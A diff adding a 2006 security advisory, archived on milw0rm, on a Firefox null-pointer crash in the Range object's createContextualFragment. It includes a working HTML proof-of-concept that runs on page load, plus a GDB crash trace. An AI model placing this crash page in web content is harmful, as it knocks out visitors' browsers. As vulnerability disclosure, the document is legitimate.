@@ -1,0 +1,223 @@
+<!--
+------------------------------------------------- 
+Gotfault Security - Advisory #05 - 27/10/06 
+------------------------------------------------- 
+Software   : Firefox
+Homepage   : http://www.mozilla.com/
+Vulnerable : 1.5.0.7 and below, 2.0
+Risk       : Moderate
+Impact     : Denial of Services (Code execution not verified)
+-------------------------------------------------
+DESCRIPTION
+-------------------------------------------------
+Mozilla Firefox is prone to a D.O.S within its javascript Range object. In a
+special condition, a NULL Pointer Deference occur and Firefox crashes.
+From DOM MDC:
+
+"The Range object represents a fragment of a document that can contain nodes 
+and parts of text nodes in a given document."
+
+A Range object can be initialized using the selectNode method, that selects a
+node to be inserted within a Range. A Range can also be used to create document
+fragments using the createContextualFragment method. Below is an example of
+using such a method, from DOM MDC:
+
+var tagString = "<div>I am a div node</div>";
+var range = document.createRange();
+range.selectNode(document.getElementsByTagName("div").item(0));
+var documentFragment = range.createContextualFragment(tagString);
+document.body.appendChild(documentFragment);
+
+As can be seen, a range is created using the createRange document method and
+then is initialized using the selectNode method against some element within
+the current document. At this point createContextualFragment can be used to
+create document fragments, that can be inserted into the document.
+Mozilla Firefox does not proper handle when a DOCUMENT_TYPE_NODE (<!DOCTYPE...)
+element is passed to selectNode method and trigger a NULL Pointer deference 
+when calling createContextualFragment method. 
+
+-------------------------------------------------
+POC
+-------------------------------------------------
+
+This POC code crashes Mozilla Firefox:
+
+--- snip ---
+-->
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+ <head>
+  <script type="text/javascript">
+   function do_crash()
+   {
+    var range;
+    range = document.createRange();
+    range.selectNode(document.firstChild);
+    range.createContextualFragment('<span></span>');
+   }
+  </script>
+ </head>
+ <body onload="do_crash()">
+  <p>Good bye Firefox!</p>
+ </body>
+</html>
+
+<!--
+--- snip ---
+
+-------------------------------------------------
+POC details
+-------------------------------------------------
+
+In [1], we use the selectNode method agains document.firstNode, that in
+this case is <!DOCTYPE ...> node. Then we use createContextualFragment
+and Firefox crashes.
+
+-------------------------------------------------
+GDB session
+-------------------------------------------------
+
+Following is the GDB session registered in the crash moment, tested
+agains Firefox 2.0 official release:
+
+--- snip ---
+
+barros@zaphod:~$ gdb /usr/lib/firefox/firefox-bin -q
+(no debugging symbols found)
+Using host libthread_db library "/lib/tls/libthread_db.so.1".
+(gdb) at 16000
+Attaching to program: /usr/lib/firefox-2.0RC3/firefox-bin, process 16000
+...
+...
+0xb7502ce3 in poll () from /lib/tls/libc.so.6
+(gdb) c
+Continuing.
+[Thread -1240372304 (LWP 16003) exited]
+[Thread -1283585104 (LWP 16010) exited]
+[New Thread -1283585104 (LWP 16018)]
+[New Thread -1240372304 (LWP 16019)]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread -1221409088 (LWP 16000)]
+0x081d98ee in nsWritingIterator<unsigned short>::advance ()
+(gdb) i r
+eax            0x0      0
+ecx            0x2cec7263       753693283
+edx            0x95b55b8        156980664
+ebx            0x1      1
+esp            0xbf89f334       0xbf89f334
+ebp            0xbf89f5b8       0xbf89f5b8
+esi            0x0      0
+edi            0x1      1
+eip            0x81d98ee        0x81d98ee
+eflags         0x10246  66118
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) bt
+#0  0x081d98ee in nsWritingIterator<unsigned short>::advance ()
+#1  0x083b4d8f in nsReadingIterator<unsigned short>::advance ()
+#2  0xb7ed339b in XPTC_InvokeByIndex () from /usr/lib/firefox/libxpcom_core.so
+#3  0x080a6960 in nsTHashtable<nsBaseHashtableET<nsDepCharHashKey, nsAutoPtr<nsINIParser::INIValue> > >::~nsTHashtable ()
+#4  0x080ac53a in nsTHashtable<nsBaseHashtableET<nsDepCharHashKey, nsAutoPtr<nsINIParser::INIValue> > >::~nsTHashtable ()
+#5  0xb7f2fed6 in js_Invoke () from /usr/lib/firefox/libmozjs.so
+#6  0xb7f3480d in js_Interpret () from /usr/lib/firefox/libmozjs.so
+#7  0xb7f2ff91 in js_Invoke () from /usr/lib/firefox/libmozjs.so
+#8  0xb7f30374 in js_InternalInvoke () from /usr/lib/firefox/libmozjs.so
+#9  0xb7f0d854 in JS_CallFunctionValue () from /usr/lib/firefox/libmozjs.so
+#10 0x0843dbb7 in nsReadingIterator<unsigned short>::advance ()
+#11 0x0846b6d9 in nsReadingIterator<unsigned short>::advance ()
+#12 0x083c9724 in nsReadingIterator<unsigned short>::advance ()
+#13 0x083c9b4b in nsReadingIterator<unsigned short>::advance ()
+#14 0x08442204 in nsReadingIterator<unsigned short>::advance ()
+#15 0x0826f4e7 in XmlInitUnknownEncodingNS ()
+#16 0x085902fa in nsXPTCVariant::Init ()
+#17 0x0856d6d8 in nsXPTCVariant::Init ()
+#18 0x0859003b in nsXPTCVariant::Init ()
+#19 0x08574845 in nsXPTCVariant::Init ()
+#20 0x08573fb7 in nsXPTCVariant::Init ()
+#21 0x08573f0e in nsXPTCVariant::Init ()
+#22 0x08573cc7 in nsXPTCVariant::Init ()
+#23 0x0812dc8c in nsTHashtable<nsBaseHashtableET<nsDepCharHashKey, nsAutoPtr<nsINIParser::INIValue> > >::~nsTHashtable ()
+#24 0x08284255 in XmlInitUnknownEncodingNS ()
+#25 0x08284002 in XmlInitUnknownEncodingNS ()
+#26 0xb7ebe11f in PL_HandleEvent () from /usr/lib/firefox/libxpcom_core.so
+#27 0xb7ebe072 in PL_ProcessPendingEvents ()
+   from /usr/lib/firefox/libxpcom_core.so
+#28 0xb7ebf69f in nsEventQueueImpl::CheckForDeactivation ()
+   from /usr/lib/firefox/libxpcom_core.so
+#29 0x0824aba4 in XmlInitUnknownEncodingNS ()
+#30 0xb797a53f in g_vasprintf () from /usr/lib/libglib-2.0.so.0
+#31 0xb7952b77 in g_main_context_dispatch () from /usr/lib/libglib-2.0.so.0
+#32 0xb7954505 in g_main_context_acquire () from /usr/lib/libglib-2.0.so.0
+#33 0xb795482a in g_main_loop_run () from /usr/lib/libglib-2.0.so.0
+#34 0xb7c0fac3 in gtk_main () from /usr/lib/libgtk-x11-2.0.so.0
+#35 0x0824ae48 in XmlInitUnknownEncodingNS ()
+#36 0x0869f4c4 in nsXPTCVariant::Init ()
+#37 0x0807d11f in ?? ()
+#38 0x08b43ff0 in ?? ()
+#39 0xb745f9b8 in ?? () from /lib/tls/libc.so.6
+#40 0x00000000 in ?? ()
+#41 0x00000000 in ?? ()
+#42 0x00000001 in ?? ()
+#43 0x08834520 in nsIFactory::GetIID()::iid ()
+#44 0xbf8a100c in ?? ()
+#45 0x08834520 in nsIFactory::GetIID()::iid ()
+#46 0xbf8a100c in ?? ()
+#47 0x00000000 in ?? ()
+#48 0x08834480 in nsIFactory::GetIID()::iid ()
+#49 0xbf8a1008 in ?? ()
+#50 0x08834480 in nsIFactory::GetIID()::iid ()
+#51 0xbf8a1008 in ?? ()
+#52 0x00000000 in ?? ()
+#53 0x00000000 in ?? ()
+#54 0x00000000 in ?? ()
+#55 0x00000001 in ?? ()
+#56 0xb7378ee0 in ?? ()
+#57 0x00000000 in ?? ()
+#58 0x00000001 in ?? ()
+#59 0x08a4ea30 in ?? ()
+#60 0x08eac128 in ?? ()
+#61 0xbf8a1058 in ?? ()
+#62 0xb7de51e7 in pthread_mutex_lock () from /lib/tls/libpthread.so.0
+#63 0x08079397 in ?? ()
+#64 0x00000001 in ?? ()
+#65 0xbf8a1384 in ?? ()
+#66 0x088330a0 in _IO_stdin_used ()
+#67 0xbf8a1358 in ?? ()
+#68 0xb7468fcb in __libc_start_main () from /lib/tls/libc.so.6
+#69 0xb7468fcb in __libc_start_main () from /lib/tls/libc.so.6
+#70 0x080792f5 in ?? ()
+(gdb) x/i $eip
+0x81d98ee <_ZN17nsWritingIteratorItE7advanceEi+75886>:  mov    0x4(%eax),%edx
+(gdb) i r eax edx
+eax            0x0      0
+edx            0x95b55b8        156980664
+(gdb) c
+Continuing.
+Detaching after fork from child process 16020.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x081d98ee in nsWritingIterator<unsigned short>::advance ()
+
+--- snip ---
+
+-------------------------------------------------
+TIMELINE
+-------------------------------------------------
+06/08/2006 - Vulnerability detected.
+04/10/2006 - Vendor contacted, no response.
+27/10/2006 - Advisory released
+
+-------------------------------------------------
+REFERENCES
+-------------------------------------------------
+http://gotfault.net/research/advisory/gadv-firefox.txt
+http://www.barrossecurity.com/download/29
+-->
+
+# milw0rm.com [2006-10-31]
